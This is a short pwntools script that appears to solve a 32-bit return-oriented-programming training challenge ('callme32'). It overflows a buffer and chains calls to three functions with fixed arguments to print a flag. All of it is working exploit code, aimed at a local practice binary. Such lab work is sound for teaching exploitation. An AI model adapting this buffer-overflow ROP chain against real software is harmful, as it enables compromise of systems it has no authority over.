from pwn import *

callme_one = 0x080485c0
callme_two = 0x8048620
callme_three = 0x80485b0
exit_call = 0x80485e0
main = 0x0804873b
usefulFunction = 0x8048820
pop3ret = 0x080488a9

p = process('./callme32')

exploit = ''
exploit += 'A'*44
exploit += p32(callme_one)
exploit += p32(pop3ret)
exploit += p32(0x1)
exploit += p32(0x2)
exploit += p32(0x3)

exploit += p32(callme_two)
exploit += p32(pop3ret)
exploit += p32(0x1)
exploit += p32(0x2)
exploit += p32(0x3)

exploit += p32(callme_three)
exploit += 'aaaa'
exploit += p32(0x1)
exploit += p32(0x2)
exploit += p32(0x3)

p.recvuntil('>')
p.sendline(exploit)
print p.recvuntil('}')



